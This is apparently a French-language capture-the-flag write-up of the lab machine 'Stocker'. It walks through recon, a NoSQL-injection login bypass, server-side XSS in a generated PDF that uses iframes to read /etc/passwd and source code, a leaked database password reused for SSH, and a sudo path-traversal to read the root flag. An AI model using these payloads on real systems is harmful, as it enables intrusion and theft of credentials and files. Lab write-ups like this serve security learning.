\chapter{stocker}
\begin{itemize}
    \item {\bf technics}: nosqli, server side xss lfi pdf, node directory
        traversal
    \item {\bf Components}: node, mongoose,  skia/PDF
    \item {\bf tools}: 
\end{itemize}


\section{Recon}
\subsection{nmap}
\begin{verbatim}
TARGET_IP=10.10.11.196
$ PORTS=$( sudo nmap --min-rate=1000 -T4 -p- $TARGET_IP | grep '^[0-9]' | 
    cut -d'/' -f 1 | tr '\n' ',' | sed s/',$'//)
$ echo $PORTS
$ sudo nmap -sVC -p$PORTS $TARGET_IP

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)
|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
|_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://stocker.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
\end{verbatim}


\subsection{http}

\begin{verbatim}
$ ffuf -u http://10.10.11.196 -H 'Host: FUZZ.stocker.htb' -w Discovery/DNS/subdomains-top1million-20000.txt -mc all -fs 178

dev                     [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 49ms]
\end{verbatim}


\begin{verbatim}
$ ffuf -u http://stocker.htb/FUZZ -w Discovery/Web-Content/common.txt

css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 27ms]
favicon.ico             [Status: 200, Size: 1150, Words: 4, Lines: 1, Duration: 28ms]
fonts                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 31ms]
img                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 28ms]
index.html              [Status: 200, Size: 15463, Words: 4199, Lines: 322, Duration: 29ms]
js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 28ms]



$ ffuf -u http://dev.stocker.htb/FUZZ -w Discovery/Web-Content/common.txt

Login                   [Status: 200, Size: 2667, Words: 492, Lines: 76, Duration: 114ms]
login                   [Status: 200, Size: 2667, Words: 492, Lines: 76, Duration: 62ms]
logout                  [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 75ms]
static                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 48ms]
stock                   [Status: 302, Size: 48, Words: 4, Lines: 1, Duration: 33ms]

\end{verbatim}

\begin{verbatim}
$ curl -i http://dev.stocker.htb/stock
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 19 Jan 2023 03:43:06 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 48
Connection: keep-alive
X-Powered-By: Express
Location: /login?error=auth-required
Vary: Accept
Set-Cookie: connect.sid=s%3AdGnVFZYrOombum18zPESvd3b0bRYD3BA.K5AwFV0dPAJ4w4rVEYD%2FjzJOPc%2FMyu9MSp8dg4bM0q4; Path=/; HttpOnly

Found. Redirecting to /login?error=auth-required
\end{verbatim}


verb+connect.sid+ signerait du Node.

\section{dev.stocker.htb}

\subsection{Authentication}

sqlmap ne donne rien.

on regarde si l'on est sur du nosql

en changeant le  \verb+Content-Type+:
\begin{verbatim}
$ curl -i -XPOST http://dev.stocker.htb/login  -H 'Content-Type: application/json' -d '{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}'
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 19 Jan 2023 04:07:51 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 28
Connection: keep-alive
X-Powered-By: Express
Location: /stock
Vary: Accept
Set-Cookie: connect.sid=s%3A7XlWdA64TbRhYVLg3icU4I2Fn6qrEMnD.x4Gh2ewotrKt317rSZweg42iSCGQttAvUBihz8tZP%2BQ; Path=/; HttpOnly

Found. Redirecting to /stock
\end{verbatim}


Quand on finalise un purchase on a un lien
(\verb+http://dev.stocker.htb/api/po/63c8c4a0f94041af63fcdbdb+ qui affiche un
pdf

\begin{verbatim}
  <script>
    const $ = (selector) => document.querySelector(selector);

    const basket = [];

    let productStore = [];

    const cartModalElement = $("#cart-modal");
    const cartModal = new bootstrap.Modal(cartModalElement);

    fetch("/api/products")
      .then((response) => response.json())
      .then((products) => {
        productStore = products;
        const template = $("#product-template");

        products.forEach((product) => {
          const clone = template.content.cloneNode(true);
          const $$ = (selector) => clone.querySelector(selector);

          $$(".item-title").textContent = product.title;
          $$(".item-description").textContent = product.description;
          $$(".item-price").textContent = `£${product.price.toFixed(2)}`;
          $$(".item-stock").textContent = `${product.currentStock} In Stock`;
          $$(".item-image").setAttribute("src", `/static/img/${product.image}`);
          $$(".add-to-basket").setAttribute("product-id", product._id);

          $("#item-container").appendChild(clone);
        });

        Array.from(document.querySelectorAll(".add-to-basket")).forEach((button) => {
          button.addEventListener("click", () => {
            const product = productStore.find((product) => product._id === button.getAttribute("product-id"));

            if (!product) return;

            const existing = basket.find((basketItem) => basketItem._id === product._id);
            if (existing) {
              existing.amount++;
            } else {
              basket.push({ ...product, amount: 1 });
            }

            alert("Added to basket!");
            console.log(basket);
          });
        });
      });

    const beforePurchase = $("#before-purchase");
    const afterPurchase = $("#after-purchase");
    const cartTable = $("#cart-table");
    const submitPurchase = $("#submit-purchase");

    const purchaseOrderLink = $("#purchase-order-link");

    cartModalElement.addEventListener("show.bs.modal", () => {
      beforePurchase.style.display = "";
      afterPurchase.style.display = "none";

      document.querySelectorAll(".basket-item").forEach((item) => item.remove());

      const template = $("#basket-template");

      basket.forEach((basketItem) => {
        const clone = template.content.cloneNode(true);

        const $$ = (selector) => clone.querySelector(selector);

        $$(".item-name").textContent = basketItem.title;

        $$(".item-quantity").textContent = basketItem.amount;
        $$(".item-price").textContent = `£${basketItem.price.toFixed(2)}`;

        cartTable.prepend(clone);
      });

      $("#cart-total").textContent = basket
        .map((x) => x.price * x.amount)
        .reduce((a, b) => a + b, 0)
        .toFixed(2);

      if (basket.length > 0) {
        submitPurchase.style.display = "";
      } else {
        submitPurchase.style.display = "none";
      }
    });

    submitPurchase.addEventListener("click", () => {
      fetch("/api/order", {
        method: "POST",
        body: JSON.stringify({ basket }),
        headers: {
          "Content-Type": "application/json",
        },
      })
        .then((response) => response.json())
        .then((response) => {
          if (!response.success) return alert("Something went wrong processing your order!");

          purchaseOrderLink.setAttribute("href", `/api/po/${response.orderId}`);

          $("#order-id").textContent = response.orderId;

          beforePurchase.style.display = "none";
          afterPurchase.style.display = "";
          submitPurchase.style.display = "none";
        });
    });
  </script>
\end{verbatim}


\begin{verbatim}
POST /api/order HTTP/1.1
Host: dev.stocker.htb
Content-Length: 163
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://dev.stocker.htb
Referer: http://dev.stocker.htb/stock
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3AGog3jRyzkXY8ZN0OyGLr9teSaA2uH8v3.wyHBaNR%2BUGhQ39I1M92fy1MJgCXadUKynavP6eLs%2FRQ
dnt: 1
sec-gpc: 1
Connection: close

{"basket":[{"_id":"638f116eeb060210cbd83a8f","title":"Bin","description":"It's a rubbish bin.","image":"bin.jpg","price":76,"currentStock":15,"__v":0,"amount":1}]}
\end{verbatim}

ca reflete le title et le prix.

voyons si ca repasse par la bdd
si on modifie le text et le prix c'est bien modifié sur le pdf.


\begin{verbatim}
$ exiftool ~/tmp/63c8d4bbf94041af63fcdbeb.pdf
ExifTool Version Number         : 12.50
File Name                       : 63c8d4bbf94041af63fcdbeb.pdf
Directory                       : /home/<REDACTED>/tmp
File Size                       : 38 kB
File Modification Date/Time     : 2023:01:19 06:53:10+01:00
File Access Date/Time           : 2023:01:19 06:53:31+01:00
File Inode Change Date/Time     : 2023:01:19 06:53:18+01:00
File Permissions                : -rw-r-----
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Tagged PDF                      : Yes
Creator                         : Chromium
Producer                        : Skia/PDF m108
Create Date                     : 2023:01:19 05:27:33+00:00
Modify Date                     : 2023:01:19 05:27:33+00:00
\end{verbatim}


en recherchant un peu on trouve cela :
\href{https://blog.noob.ninja/local-file-read-via-xss-in-dynamically-generated-pdf/}{Local
File Read via XSS in Dynamically Generated PDF}

donc il faudrait injecter dans le titre un truc du genre 
\begin{verbatim}
<iframe src="file:///etc/passwd"></iframe>
\end{verbatim}

et cela s'affiche bien dedans par contre on ne peut pas tout lire

\begin{verbatim}
$ pdftotext ~/tmp/test.pdf output.txt && cat output.txt
London
GB

1/19/2023
Thanks for shopping with us!
Your order summary:
Item
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/s
bin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/s
bin/nologin
man:x:6:12:man:/var/cache/man:/usr/s
bi / l i

Total
...SNIP...
\end{verbatim}

donc on augmente la taille de la frame

\begin{verbatim}
<iframe src=file:///etc/passwd height=1000px width=1000px></iframe>
$ pdftotext ~/tmp/test.pdf output.txt && cat output.txt
...SNIP...
angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
...SNIP...
\end{verbatim}


si on leak le code
\begin{verbatim}
"title":"<script> document.write(window.location) </script>",
file:///var/www/dev/pos/63c8e716f94041af63fcdc09.html

<iframe src=file:///var/www/dev/index.js height=1000px width=1000px></iframe>

...SNIP...
const app = express();
const port = 3000;
// TODO: Configure loading from dotenv for production
const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";
...SNIP...
\end{verbatim}

\section{Foothold}

\begin{verbatim}
## IHeardPassphrasesArePrettySecure
$ ssh angoose@stocker.htb
angoose@stocker:~$
\end{verbatim}


le code de login
\begin{verbatim}
app.post("/login", async (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) return res.redirect("/login?error=login-error");

  // TODO: Implement hashing

  const user = await mongoose.model("User").findOne({ username, password });

  if (!user) return res.redirect("/login?error=login-error");

  req.session.user = user.id;

  console.log(req.session);

  return res.redirect("/stock");
});

\end{verbatim}

mongoose Elegant MongoDB object modeling for Node.js


\begin{verbatim}
$ sudo -l
[sudo] password for angoose:
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
\end{verbatim}

si on essaie un directory traversal

\begin{verbatim}
$ cat pwn.js
const fs = require('fs');

fs.readFile('/root/root.txt', 'utf8', (err, data) => {
          if (err) throw err;
          console.log(data);
});

const fs = require('fs');

fs.readFile('/root/root.txt', 'utf8', (err, data) => {
  if (err) throw err;
  console.log(data);
});

$ sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/pwn.js

\end{verbatim}
